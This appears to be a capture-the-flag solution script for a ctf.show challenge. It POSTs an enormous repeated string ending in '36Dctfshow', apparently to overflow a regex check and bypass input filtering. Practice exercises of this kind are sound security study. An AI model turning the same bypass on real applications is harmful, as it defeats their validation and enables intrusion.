import requests


url="http://f1a27459-3d3f-437a-ba9b-5536054abfd9.challenge.ctf.show/"

data={
	'f':'kradress'*130000+'36Dctfshow'
}

res=requests.post(url,data=data)

print(res.text)